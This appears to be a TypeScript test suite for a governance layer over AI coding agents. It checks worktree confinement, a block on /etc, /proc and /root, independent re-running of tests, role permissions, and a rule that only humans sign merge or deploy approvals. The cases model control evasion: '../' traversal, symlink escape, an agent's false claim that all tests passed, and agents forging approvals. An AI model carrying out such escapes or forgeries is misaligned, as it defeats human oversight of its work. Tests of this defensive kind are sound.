      const res = await validateDirectoryScope(fixtureDir, worktreePolicy);
      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.message).toContain("outside assigned worktree");
      }

      // Target path inside worktree is allowed
      const validRes = await validateDirectoryScope(worktreePath, worktreePolicy);
      expect(validRes.ok).toBe(true);
    });

    it("rejects sensitive system paths (/etc, /proc, /root)", async () => {
      const sysPolicy: QualitySecurityPolicy = {
        allowedRootDirs: ["/etc", "/proc", "/root"],
        maxExecutionTimeoutMs: 300_000,
        allowedCommands: []
      };

      const etcRes = await validateDirectoryScope("/etc", sysPolicy);
      expect(etcRes.ok).toBe(false);
      if (!etcRes.ok) expect(etcRes.error.message).toContain("is blocked");

      const procRes = await validateDirectoryScope("/proc", sysPolicy);
      expect(procRes.ok).toBe(false);
    });

    it("rejects symlinks inside allowedRootDirs that point outside allowedRootDirs", async () => {
      const outsideDir = await fs.mkdtemp(path.join(os.tmpdir(), "qg-sym-out-"));
      const symlinkPath = path.join(fixtureDir, "symlink-to-outside");

      try {
        await fs.symlink(outsideDir, symlinkPath, "dir");
        const res = await validateDirectoryScope(symlinkPath, testPolicy);
        expect(res.ok).toBe(false);
        if (!res.ok) {
          expect(res.error.message).toContain("outside allowed roots");
        }
      } finally {
        try {
          await fs.unlink(symlinkPath);
        } catch {}
        await fs.rm(outsideDir, { recursive: true, force: true });
      }
    });

    it("rejects non-existent directories or paths pointing to a regular file", async () => {
      const nonExistent = path.join(fixtureDir, "does-not-exist");
      const res1 = await validateDirectoryScope(nonExistent, testPolicy);
      expect(res1.ok).toBe(false);
      if (!res1.ok) {
        expect(res1.error.message).toContain("does not exist");
      }

      const regularFile = path.join(fixtureDir, "pass.mjs");
      const res2 = await validateDirectoryScope(regularFile, testPolicy);
      expect(res2.ok).toBe(false);
      if (!res2.ok) {
        expect(res2.error.message).toContain("is not a directory");
      }
    });
  });

  // =========================================================================
  // 6. Missing Evidence, Skipped Checks & Independence from AI Claims
  // =========================================================================
  describe("6. Missing Evidence, Skipped Checks & Independence from AI Claims", () => {
    it("rejects command exiting 0 with empty output when evidence is required", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-empty-output",
          checkKind: "typecheck",
          command: { executable: "node", args: ["empty.mjs"] },
          workingDirectory: fixtureDir,
          requireEvidence: true
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-empty-output"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(
        res.value.findings.some(
          (f) => f.code === "MISSING_EXECUTION_EVIDENCE"
        )
      ).toBe(true);
    });

    it("rejects unit_test check exiting 0 when output reports 0 passed or No tests found", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-zero-tests",
          checkKind: "unit_test",
          command: { executable: "node", args: ["zero-tests.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-zero-tests"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(
        res.value.findings.some(
          (f) => f.code === "MISSING_EXECUTION_EVIDENCE"
        )
      ).toBe(true);
    });

    it("rejects skipping a required check with REQUIRED_CHECK_SKIPPED_OR_MISSING_EVIDENCE", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-skip-required",
          checkKind: "typecheck",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir,
          required: true,
          skip: true
        },
        securityPolicy: testPolicy
      });

      const res = await gate.evaluateDetailed(makeContext("qg-skip-required"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(res.value.contractResult.status).toBe("failed");
      expect(
        res.value.findings.some(
          (f) => f.code === "REQUIRED_CHECK_SKIPPED_OR_MISSING_EVIDENCE"
        )
      ).toBe(true);
    });

    it("allows skipping an optional check returning skipped on checkResult and passed with CHECK_SKIPPED", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-skip-optional",
          checkKind: "lint",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir,
          required: false,
          skip: true,
          skipReason: "Optional lint skipped in fast mode"
        },
        securityPolicy: testPolicy
      });

      const context = makeContext("qg-skip-optional", {
        definition: {
          id: "qg-skip-optional",
          name: "Optional Lint",
          evaluator: "command",
          required: false,
          timeout: { executionTimeoutMs: 30000, onTimeout: "fail" }
        }
      });

      const res = await gate.evaluateDetailed(context);
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("skipped");
      expect(res.value.contractResult.status).toBe("passed");
      expect(
        res.value.findings.some((f) => f.code === "CHECK_SKIPPED")
      ).toBe(true);
      expect(res.value.findings[0]?.severity).toBe("info");
    });

    it("proves complete independence from subjective AI agent claims", async () => {
      // AI agent claims complete 100% success
      const context = makeContext("qg-independent", {
        agentResult: makeAgentResult({
          status: "succeeded",
          output: {
            summary: "All 500 unit tests passed with 100% code coverage. Ready to merge!"
          }
        })
      });

      // The independent quality gate re-executes the test suite and fails
      const gate = createQualityGate({
        spec: {
          gateId: "qg-independent",
          checkKind: "unit_test",
          command: { executable: "node", args: ["fail.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(context);
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(res.value.contractResult.status).toBe("failed");
      expect(res.value.contractResult.metadata?.independentOfAgentClaims).toBe(true);
    });
  });

  // =========================================================================
  // 7. Role-Based Access Control (RBAC)
  // =========================================================================
  describe("7. Role-Based Access Control (RBAC)", () => {
    it("verifies roles, actions, and authorization policies constants", () => {
      expect(QUALITY_POLICY_ROLES).toEqual([
        "reviewer",
        "developer",
        "qa",
        "delivery"
      ]);
      expect(QUALITY_POLICY_ACTIONS).toHaveLength(8);
      expect(ROLE_AUTHORIZATION_POLICIES.reviewer.readOnly).toBe(true);
      expect(ROLE_AUTHORIZATION_POLICIES.developer.readOnly).toBe(false);
      expect(ROLE_AUTHORIZATION_POLICIES.qa.readOnly).toBe(true);
      expect(ROLE_AUTHORIZATION_POLICIES.delivery.requiresHumanApprovalBeforeMergeOrDeploy).toBe(true);
    });

    it("reviewer role: allows read_code, analyze_code; rejects modify_code and modifiedFiles", () => {
      const readRes = authorizeRoleAction({
        role: "reviewer",
        action: "read_code",
        actorId: "rev-alice"
      });
      expect(readRes.ok).toBe(true);
      if (readRes.ok) expect(readRes.value.readOnly).toBe(true);

      const analyzeRes = authorizeRoleAction({
        role: "reviewer",
        action: "analyze_code",
        actorId: "rev-alice"
      });
      expect(analyzeRes.ok).toBe(true);

      const modifyRes = authorizeRoleAction({
        role: "reviewer",
        action: "modify_code",
        actorId: "rev-alice"
      });
      expect(modifyRes.ok).toBe(false);

      const fileModRes = authorizeRoleAction({
        role: "reviewer",
        action: "read_code",
        actorId: "rev-alice",
        modifiedFiles: ["src/index.ts"]
      });
      expect(fileModRes.ok).toBe(false);
    });

    it("developer role: allows modify_code and run_local_check inside worktree; rejects escape and merge/deploy", () => {
      const worktree = path.join(fixtureDir, "dev-worktree");

      // Valid action inside worktree
      const modRes = authorizeRoleAction({
        role: "developer",
        action: "modify_code",
        actorId: "dev-bob",
        assignedWorktreePath: worktree,
        targetPath: path.join(worktree, "src/feature.ts"),
        modifiedFiles: ["src/feature.ts"]
      });
      expect(modRes.ok).toBe(true);
      if (modRes.ok) expect(modRes.value.readOnly).toBe(false);

      const checkRes = authorizeRoleAction({
        role: "developer",
        action: "run_local_check",
        actorId: "dev-bob",
        assignedWorktreePath: worktree
      });
      expect(checkRes.ok).toBe(true);

      // Rejects without assignedWorktreePath
      const noWorktreeRes = authorizeRoleAction({
        role: "developer",
        action: "modify_code",
        actorId: "dev-bob"
      });
      expect(noWorktreeRes.ok).toBe(false);

      // Rejects when targetPath escapes worktree
      const escapeRes = authorizeRoleAction({
        role: "developer",
        action: "modify_code",
        actorId: "dev-bob",
        assignedWorktreePath: worktree,
        targetPath: path.join(fixtureDir, "outside.ts")
      });
      expect(escapeRes.ok).toBe(false);

      // Rejects when modifiedFiles has traversal
      const traversalRes = authorizeRoleAction({
        role: "developer",
        action: "modify_code",
        actorId: "dev-bob",
        assignedWorktreePath: worktree,
        modifiedFiles: ["../outside.ts"]
      });
      expect(traversalRes.ok).toBe(false);

      // Rejects merge_branch and deploy_release for developer
      expect(
        authorizeRoleAction({
          role: "developer",
          action: "merge_branch",
          actorId: "dev-bob"
        }).ok
      ).toBe(false);

      expect(
        authorizeRoleAction({
          role: "developer",
          action: "deploy_release",
          actorId: "dev-bob"
        }).ok
      ).toBe(false);
    });

    it("qa role: allows test execution in test/ci; rejects production and file modification", () => {
      // Allowed environments
      const ciRes = authorizeRoleAction({
        role: "qa",
        action: "execute_test_suite",
        actorId: "qa-carol",
        environment: "ci"
      });
      expect(ciRes.ok).toBe(true);

      const testRes = authorizeRoleAction({
        role: "qa",
        action: "evaluate_quality_gate",
        actorId: "qa-carol",
        environment: "test"
      });
      expect(testRes.ok).toBe(true);

      // Rejects production environment
      const prodRes = authorizeRoleAction({
        role: "qa",
        action: "execute_test_suite",
        actorId: "qa-carol",
        environment: "production"
      });
      expect(prodRes.ok).toBe(false);

      // Rejects missing environment
      const noEnvRes = authorizeRoleAction({
        role: "qa",
        action: "execute_test_suite",
        actorId: "qa-carol"
      });
      expect(noEnvRes.ok).toBe(false);

      // Rejects file modification
      const modRes = authorizeRoleAction({
        role: "qa",
        action: "modify_code",
        actorId: "qa-carol"
      });
      expect(modRes.ok).toBe(false);

      const fileModRes = authorizeRoleAction({
        role: "qa",
        action: "execute_test_suite",
        actorId: "qa-carol",
        environment: "ci",
        modifiedFiles: ["src/test.ts"]
      });
      expect(fileModRes.ok).toBe(false);
    });

    it("delivery role: allows merge/deploy ONLY with passed gates AND valid human approval", () => {
      const passGate = makePassingGateResult("gate-build");
      const failGate = makeFailingGateResult("gate-lint");
      const validHumanDecision = makeApprovalDecision();

      // 1. All gates pass + valid human approval -> authorized
      const authMerge = authorizeRoleAction({
        role: "delivery",
        action: "merge_branch",
        actorId: "del-dave",
        automatedGateResults: [passGate],
        humanApprovalDecision: validHumanDecision
      });
      expect(authMerge.ok).toBe(true);
      if (authMerge.ok) {
        expect(authMerge.value.authorized).toBe(true);
        expect(authMerge.value.humanApprovalVerified).toBe(true);
      }

      const authDeploy = authorizeRoleAction({
        role: "delivery",
        action: "deploy_release",
        actorId: "del-dave",
        automatedGateResults: [passGate],
        humanApprovalDecision: validHumanDecision
      });
      expect(authDeploy.ok).toBe(true);

      // 2. Automated gate failed -> rejects even with human approval
      const failGateRes = authorizeRoleAction({
        role: "delivery",
        action: "merge_branch",
        actorId: "del-dave",
        automatedGateResults: [passGate, failGate],
        humanApprovalDecision: validHumanDecision
      });
      expect(failGateRes.ok).toBe(false);

      // 3. Missing human approval -> rejects
      const noApprovalRes = authorizeRoleAction({
        role: "delivery",
        action: "merge_branch",
        actorId: "del-dave",
        automatedGateResults: [passGate]
      });
      expect(noApprovalRes.ok).toBe(false);

      // 4. Human approval rejected -> rejects
      const rejectedDecision = makeApprovalDecision({
        decision: "rejected",
        reason: "Security risk identified in audit"
      });
      const rejectRes = authorizeRoleAction({
        role: "delivery",
        action: "merge_branch",
        actorId: "del-dave",
        automatedGateResults: [passGate],
        humanApprovalDecision: rejectedDecision
      });
      expect(rejectRes.ok).toBe(false);

      // 5. AI agent attempting to satisfy human approval -> rejects
      const agentDecision = makeApprovalDecision({
        decidedBy: "agent:delivery-agent"
      });
      const agentRes = authorizeRoleAction({
        role: "delivery",
        action: "merge_branch",
        actorId: "del-dave",
        automatedGateResults: [passGate],
        humanApprovalDecision: agentDecision
      });
      expect(agentRes.ok).toBe(false);
      if (!agentRes.ok) {
        expect(agentRes.error.message).toContain("cannot be satisfied by an automated or AI agent actor");
      }

      const botDecision = makeApprovalDecision({
        decidedBy: "bot:auto-merge"
      });
      const botRes = authorizeRoleAction({
        role: "delivery",
        action: "merge_branch",
        actorId: "del-dave",
        automatedGateResults: [passGate],
        humanApprovalDecision: botDecision
      });
      expect(botRes.ok).toBe(false);
    });
  });

  // =========================================================================
  // 8. Automated Checks vs Mandatory Human Approval & Application Limitations
  // =========================================================================
  describe("8. Automated Checks vs Mandatory Human Approval & Application Limitations", () => {
    it("isHumanApprover correctly distinguishes verified humans from automated/AI agents", () => {
      // Verified human identifiers
      expect(isHumanApprover("human:tech-lead")).toBe(true);
      expect(isHumanApprover("alice@company.com")).toBe(true);
      expect(isHumanApprover("lead-architect-bob")).toBe(true);
      expect(isHumanApprover("carol.security")).toBe(true);

      // Automated and AI agent prefixes
      expect(isHumanApprover("agent:reviewer-1")).toBe(false);
      expect(isHumanApprover("ai:code-assistant")).toBe(false);
      expect(isHumanApprover("bot:auto-merge")).toBe(false);
      expect(isHumanApprover("system:ci-pipeline")).toBe(false);
      expect(isHumanApprover("auto:scheduler")).toBe(false);
      expect(isHumanApprover("llm:gpt4")).toBe(false);
      expect(isHumanApprover("planner:sdlc")).toBe(false);
      expect(isHumanApprover("developer:agent-2")).toBe(false);
      expect(isHumanApprover("reviewer:agent-3")).toBe(false);
      expect(isHumanApprover("qa:agent-4")).toBe(false);
      expect(isHumanApprover("")).toBe(false);
    });

    it("evaluates governance: all pass + requires human approval + no decision -> pending, cannot deliver", () => {
      const passGate = makePassingGateResult("gate-1");
      const res = evaluateAutomatedVsHumanGovernance({
        runId: "run-101",
        taskId: "task-build",
        automatedGateResults: [passGate],
        requiresHumanApproval: true
      });

      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.automatedChecksStatus).toBe("passed");
      expect(res.value.allAutomatedGatesPassed).toBe(true);
      expect(res.value.humanApprovalStatus).toBe("pending");
      expect(res.value.canProceedToDelivery).toBe(false);
    });

    it("evaluates governance: all pass + requires human approval + human approved -> approved, can deliver", () => {
      const passGate = makePassingGateResult("gate-1");
      const decision = makeApprovalDecision({
        decision: "approved",
        decidedBy: "human:release-manager"
      });

      const res = evaluateAutomatedVsHumanGovernance({
        runId: "run-101",
        taskId: "task-build",
        automatedGateResults: [passGate],
        requiresHumanApproval: true,
        humanApprovalDecision: decision
      });

      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.allAutomatedGatesPassed).toBe(true);
      expect(res.value.humanApprovalStatus).toBe("approved");
      expect(res.value.humanApproverId).toBe("human:release-manager");
      expect(res.value.canProceedToDelivery).toBe(true);
    });

    it("evaluates governance: all pass + requires human approval + human rejected -> rejected, cannot deliver", () => {
      const passGate = makePassingGateResult("gate-1");
      const decision = makeApprovalDecision({
        decision: "rejected",
        reason: "Compliance review rejected changes",
        decidedBy: "human:compliance-officer"
      });

      const res = evaluateAutomatedVsHumanGovernance({
        runId: "run-101",
        taskId: "task-build",
        automatedGateResults: [passGate],
        requiresHumanApproval: true,
        humanApprovalDecision: decision
      });

      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.allAutomatedGatesPassed).toBe(true);
      expect(res.value.humanApprovalStatus).toBe("rejected");
      expect(res.value.canProceedToDelivery).toBe(false);
    });

    it("evaluates governance: automated gate failed + human approved -> cannot deliver", () => {
      const passGate = makePassingGateResult("gate-1");
      const failGate = makeFailingGateResult("gate-2");
      const decision = makeApprovalDecision({
        decision: "approved",
        decidedBy: "human:tech-lead"
      });

      const res = evaluateAutomatedVsHumanGovernance({
        runId: "run-101",
        taskId: "task-build",
        automatedGateResults: [passGate, failGate],
        requiresHumanApproval: true,
        humanApprovalDecision: decision
      });

      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.automatedChecksStatus).toBe("failed");
      expect(res.value.allAutomatedGatesPassed).toBe(false);
      expect(res.value.humanApprovalStatus).toBe("approved");
      expect(res.value.canProceedToDelivery).toBe(false);
    });

    it("evaluates governance: rejects AI agent attempting to sign human approval decision", () => {
      const passGate = makePassingGateResult("gate-1");
      const agentDecision = makeApprovalDecision({
        decidedBy: "agent:autonomous-lead"
      });

      const res = evaluateAutomatedVsHumanGovernance({
        runId: "run-101",
        taskId: "task-build",
        automatedGateResults: [passGate],
        requiresHumanApproval: true,
        humanApprovalDecision: agentDecision
      });

      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.message).toContain(
          "cannot be satisfied by an automated or AI agent actor"
        );
      }
    });

    it("verifies application security limitations report transparency", () => {
      const report = getSecurityControlLimitationsReport();

      expect(report.layer).toBe("application");
      expect(report.isCompleteSandbox).toBe(false);
      expect(report.enforcedControls.length).toBeGreaterThan(0);
      expect(report.limitations.length).toBeGreaterThan(0);
      expect(report.limitations).toEqual(APPLICATION_SECURITY_LIMITATIONS);

      // Verify createDefaultSecurityPolicy helper
      const polRes = createDefaultSecurityPolicy({
        allowedRootDirs: [fixtureDir],
        maxExecutionTimeoutMs: 60000
      });
      expect(polRes.ok).toBe(true);
      if (polRes.ok) {
        expect(polRes.value.maxExecutionTimeoutMs).toBe(60000);
      }
    });
  });
});
